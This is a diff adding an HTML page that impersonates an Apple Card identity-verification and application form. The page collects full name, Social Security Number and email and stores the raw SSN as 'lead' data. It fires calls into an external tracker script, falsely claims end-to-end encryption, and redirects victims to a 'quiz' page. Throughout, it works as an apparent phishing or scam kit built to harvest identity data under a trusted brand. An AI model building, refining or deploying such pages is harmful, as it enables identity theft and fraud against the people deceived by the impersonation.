@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Identity Verification — Apple Card</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --apple-black: #1D1D1F;
+            --apple-white: #F5F5F7;
+            --apple-blue: #0071E3;
+            --apple-blue-hover: #0077ED;
+            --gray-100: #F5F5F7;
+            --gray-200: #E8E8ED;
+            --gray-300: #D2D2D7;
+            --gray-400: #86868B;
+            --gray-500: #6E6E73;
+            --gray-600: #424245;
+            --gray-800: #1D1D1F;
+            --success: #34C759;
+            --error: #FF3B30;
+            --surface-primary: #FFFFFF;
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-lg: 0 8px 30px rgba(0,0,0,0.12);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Helvetica Neue', sans-serif;
+            background: var(--gray-100);
+            color: var(--apple-black);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .page-wrapper {
+            max-width: 520px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: var(--surface-primary);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Nav */
+        .nav {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px 24px;
+            background: rgba(255,255,255,0.72);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border-bottom: 0.5px solid var(--gray-200);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .nav-logo { display: flex; align-items: center; gap: 8px; }
+        .nav-logo img { width: 28px; height: 34px; }
+        .nav-logo span { font-size: 1.125rem; font-weight: 600; color: var(--apple-black); letter-spacing: -0.02em; }
+
+        /* Progress */
+        .progress-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 20px 24px 0;
+        }
+        .progress-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--gray-300);
+            transition: all 0.4s ease;
+        }
+        .progress-dot.active {
+            background: var(--apple-blue);
+            width: 24px;
+            border-radius: 4px;
+        }
+        .progress-dot.done { background: var(--success); }
+        .progress-line {
+            width: 20px;
+            height: 2px;
+            background: var(--gray-300);
+            border-radius: 1px;
+            transition: background 0.4s ease;
+        }
+        .progress-line.done { background: var(--success); }
+
+        /* Content */
+        .content {
+            flex: 1;
+            padding: 32px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step-container {
+            width: 100%;
+            text-align: center;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        .step-container.hidden { display: none; }
+
+        .step-icon {
+            width: 64px;
+            height: 64px;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        .step-icon.blue { background: rgba(0,113,227,0.1); }
+        .step-icon.blue svg { width: 28px; height: 28px; fill: var(--apple-blue); }
+        .step-icon.green { background: rgba(52,199,89,0.1); }
+        .step-icon.green svg { width: 28px; height: 28px; fill: var(--success); }
+
+        .step-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 8px;
+            color: var(--apple-black);
+        }
+
+        .step-subtitle {
+            font-size: 0.9375rem;
+            color: var(--gray-500);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        /* Input Group */
+        .input-group {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            text-align: left;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 0.8125rem;
+            font-weight: 500;
+            color: var(--gray-600);
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-wrapper svg {
+            position: absolute;
+            left: 16px;
+            width: 18px;
+            height: 18px;
+            fill: var(--gray-400);
+            transition: fill 0.2s ease;
+            pointer-events: none;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 16px 16px 46px;
+            border: 1.5px solid var(--gray-300);
+            border-radius: 12px;
+            font-size: 1.0625rem;
+            font-family: inherit;
+            color: var(--apple-black);
+            background: var(--surface-primary);
+            transition: all 0.2s ease;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 3px rgba(0,113,227,0.15);
+        }
+
+        .input-field:focus + svg,
+        .input-wrapper:focus-within svg {
+            fill: var(--apple-blue);
+        }
+
+        .input-field::placeholder {
+            color: var(--gray-400);
+        }
+
+        .input-error {
+            font-size: 0.75rem;
+            color: var(--error);
+            margin-top: 6px;
+            display: none;
+        }
+
+        .input-error.show { display: block; }
+
+        .btn-primary {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            max-width: 360px;
+            padding: 16px 32px;
+            background: var(--apple-blue);
+            color: #fff;
+            border: none;
+            border-radius: 14px;
+            font-size: 1.0625rem;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            margin-top: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            background: var(--apple-blue-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 16px rgba(0,113,227,0.3);
+        }
+
+        .btn-primary:disabled {
+            background: var(--gray-300);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-primary .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+
+        .btn-primary.loading .spinner { display: block; }
+        .btn-primary.loading .btn-text { display: none; }
+
+        /* Confirm Card */
+        .confirm-card {
+            width: 100%;
+            max-width: 360px;
+            margin: 0 auto;
+            background: var(--surface-primary);
+            border: 1.5px solid var(--gray-200);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: left;
+        }
+
+        .confirm-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+        }
+
+        .confirm-row:not(:last-child) {
+            border-bottom: 1px solid var(--gray-200);
+        }
+
+        .confirm-row .label {
+            font-size: 0.8125rem;
+            color: var(--gray-500);
+        }
+
+        .confirm-row .value {
+            font-size: 0.9375rem;
+            font-weight: 600;
+            color: var(--apple-black);
+        }
+
+        .confirm-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+            width: 100%;
+            max-width: 360px;
+        }
+
+        .btn-secondary {
+            flex: 1;
+            padding: 14px;
+            border: 1.5px solid var(--gray-300);
+            border-radius: 12px;
+            background: var(--surface-primary);
+            font-size: 0.9375rem;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            color: var(--gray-600);
+            transition: all 0.2s ease;
+        }
+
+        .btn-secondary:hover { border-color: var(--gray-400); background: var(--gray-100); }
+
+        .btn-confirm {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            background: var(--success);
+            color: #fff;
+            font-size: 0.9375rem;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-confirm:hover { background: #2DB84D; transform: translateY(-1px); }
+
+        /* Success State */
+        .success-icon {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: var(--success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            animation: successPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .success-icon svg {
+            width: 32px;
+            height: 32px;
+            fill: #fff;
+        }
+
+        .success-text {
+            font-size: 0.875rem;
+            color: var(--gray-500);
+            margin-top: 16px;
+        }
+
+        .success-loader {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 12px;
+        }
+
+        .success-loader .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--apple-blue);
+            animation: loadBounce 1.2s ease-in-out infinite;
+        }
+
+        .success-loader .dot:nth-child(2) { animation-delay: 0.15s; }
+        .success-loader .dot:nth-child(3) { animation-delay: 0.3s; }
+
+        /* Security note */
+        .security-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: auto;
+            padding: 20px 24px;
+            font-size: 0.75rem;
+            color: var(--gray-400);
+        }
+
+        .security-note svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--gray-400);
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes successPop {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        @keyframes loadBounce {
+            0%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-8px); }
+        }
+
+        @media (max-width: 380px) {
+            .step-title { font-size: 1.375rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <!-- Nav -->
+        <nav class="nav">
+            <div class="nav-logo">
+                <img src="assets/images/black.svg" alt="" style="width:28px;height:34px">
+                <span>Card</span>
+            </div>
+        </nav>
+
+        <!-- Progress -->
+        <div class="progress-bar">
+            <div class="progress-dot active" id="dot1"></div>
+            <div class="progress-line" id="line1"></div>
+            <div class="progress-dot" id="dot2"></div>
+        </div>
+
+        <!-- Step 1: Comprehensive Data Form -->
+        <div class="content">
+            <div class="step-container" id="step1">
+                <div class="step-icon blue">
+                    <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                </div>
+                <h1 class="step-title">Apply for Apple Card</h1>
+                <p class="step-subtitle">Enter your information to get started.</p>
+
+                <div class="input-group">
+                    <label class="input-label" for="nameInput">Full name</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="nameInput" class="input-field" placeholder="Name as shown on your ID" autocomplete="name">
+                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    </div>
+                    <div class="input-error" id="nameError">Please enter your full name.</div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="ssnInput">Social Security Number (SSN)</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="ssnInput" class="input-field" placeholder="XXX-XX-XXXX" maxlength="11" inputmode="numeric" autocomplete="off">
+                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3-9H9V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2z"/></svg>
+                    </div>
+                    <div class="input-error" id="ssnError">Invalid SSN.</div>
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label" for="emailInput">Email</label>
+                    <div class="input-wrapper">
+                        <input type="email" id="emailInput" class="input-field" placeholder="you@email.com" autocomplete="email" inputmode="email">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                    </div>
+                    <div class="input-error" id="emailError">Invalid email address.</div>
+                </div>
+
+                <button class="btn-primary" id="btnSubmit" disabled>
+                    <span class="btn-text">Continue</span>
+                    <div class="spinner"></div>
+                </button>
+            </div>
+
+            <!-- Step 2: Success -->
+            <div class="step-container hidden" id="step2">
+                <div class="success-icon">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+                </div>
+                <h1 class="step-title">Information Received</h1>
+                <p class="step-subtitle">Your information has been saved successfully. We're preparing your Apple Card review.</p>
+
+                <div class="success-text">Redirecting...</div>
+                <div class="success-loader">
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                    <div class="dot"></div>
+                </div>
+            </div>
+
+            <!-- Security Note -->
+            <div class="security-note">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                Your data is protected with end-to-end encryption
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /* ===== UTM TRACKING ===== */
+        (function(){
+            var utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+            var p = new URLSearchParams(window.location.search);
+            utmKeys.forEach(function(k){ var v = p.get(k); if(v) localStorage.setItem(k, v); });
+        })();
+
+        /* ===== LEAD DATA ===== */
+        const LeadData = {
+            _key: 'applecard_lead',
+            save(data) { localStorage.setItem(this._key, JSON.stringify(data)); },
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}'); } catch { return {}; } },
+            update(newData) {
+                const current = this.load();
+                const updated = { ...current, ...newData, updated_at: Date.now() };
+                if (!updated.lead_id) updated.lead_id = 'AC' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substr(2,4).toUpperCase();
+                this.save(updated);
+                return updated;
+            }
+        };
+
+        /* ===== URL PARAMS ===== */
+        function getUrlParams() {
+            const params = {};
+            new URLSearchParams(window.location.search).forEach((v,k) => params[k]=v);
+            return params;
+        }
+        function buildUrl(base, extra = {}) {
+            const url = new URL(base, window.location.href);
+            const existing = new URLSearchParams(window.location.search);
+            existing.forEach((v,k) => url.searchParams.set(k,v));
+            Object.entries(extra).forEach(([k,v]) => { if(v) url.searchParams.set(k,v); });
+            return url.toString();
+        }
+
+        /* ===== INPUTS ===== */
+        const nameInput  = document.getElementById('nameInput');
+        const ssnInput   = document.getElementById('ssnInput');
+        const emailInput = document.getElementById('emailInput');
+        const btnSubmit  = document.getElementById('btnSubmit');
+        const emailError = document.getElementById('emailError');
+        const nameError = document.getElementById('nameError');
+        const ssnError  = document.getElementById('ssnError');
+
+        /* ===== SSN mask & validation ===== */
+        ssnInput.addEventListener('input', function() {
+            let v = this.value.replace(/\D/g, '');
+            if (v.length > 9) v = v.slice(0, 9);
+            if (v.length > 5) v = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5);
+            else if (v.length > 3) v = v.slice(0,3) + '-' + v.slice(3);
+            this.value = v;
+            ssnError.classList.remove('show');
+            updateBtnState();
+        });
+
+        nameInput.addEventListener('input', function() {
+            nameError.classList.remove('show');
+            updateBtnState();
+        });
+
+        emailInput.addEventListener('input', function() {
+            emailError.classList.remove('show');
+            updateBtnState();
+        });
+
+        function isEmailValid(v) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v || '').trim());
+        }
+
+        function updateBtnState() {
+            const nameOk = nameInput.value.trim().split(/\s+/).filter(Boolean).length >= 2;
+            const ssnRaw = ssnInput.value.replace(/\D/g, '');
+            const ssnOk  = ssnRaw.length === 9;
+            const emailOk = isEmailValid(emailInput.value);
+            btnSubmit.disabled = !(nameOk && ssnOk && emailOk);
+        }
+
+        function validateSSN(ssn) {
+            const digits = String(ssn).replace(/\D+/g, '');
+            if (digits.length !== 9) return false;
+            if (/^(\d)\1{8}$/.test(digits)) return false;
+            // Area number cannot be 000, 666, or 900-999
+            const area = parseInt(digits.slice(0,3), 10);
+            if (area === 0 || area === 666 || area >= 900) return false;
+            // Group number cannot be 00
+            if (digits.slice(3,5) === '00') return false;
+            // Serial cannot be 0000
+            if (digits.slice(5) === '0000') return false;
+            return true;
+        }
+
+        function maskSsn(ssn) {
+            const raw = String(ssn).replace(/\D+/g, '');
+            return '***-**-' + raw.slice(5);
+        }
+
+        /* ===== Submit ===== */
+        btnSubmit.addEventListener('click', function() {
+            const name = nameInput.value.trim().replace(/\s+/g, ' ');
+            const rawSsn = ssnInput.value.replace(/\D/g, '');
+            const email = emailInput.value.trim();
+            let hasError = false;
+
+            if (name.split(' ').filter(Boolean).length < 2) {
+                nameError.classList.add('show');
+                hasError = true;
+            }
+            if (!validateSSN(rawSsn)) {
+                ssnError.classList.add('show');
+                hasError = true;
+            }
+            if (!isEmailValid(email)) {
+                emailError.classList.add('show');
+                hasError = true;
+            }
+            if (hasError) return;
+
+            this.classList.add('loading');
+            this.disabled = true;
+
+            LeadData.update({
+                email: email,
+                ssn: rawSsn,
+                ssn_masked: maskSsn(rawSsn),
+                nome: name.toUpperCase(),
+                identity_confirmed: true,
+                page: 'login'
+            });
+
+            if (window.track) window.track('Lead', { content_id: 'apple-card-us', currency: 'USD' });
+            if (window.identifyUser) window.identifyUser();
+
+            // Small delay to smooth out the transition
+            setTimeout(showSuccess, 600);
+        });
+
+        // Enter key
+        [nameInput, ssnInput, emailInput].forEach(el => {
+            el.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && !btnSubmit.disabled) btnSubmit.click();
+            });
+        });
+
+        function showSuccess() {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+
+            document.getElementById('dot1').classList.remove('active');
+            document.getElementById('dot1').classList.add('done');
+            document.getElementById('line1').classList.add('done');
+            document.getElementById('dot2').classList.add('active');
+            document.getElementById('dot2').classList.add('done');
+
+            const data = LeadData.load();
+            setTimeout(() => {
+                window.location.href = buildUrl('quiz.html');
+            }, 2500);
+        }
+
+        // Auto-focus
+        setTimeout(() => nameInput.focus(), 300);
+    </script>
+</body>
+</html>
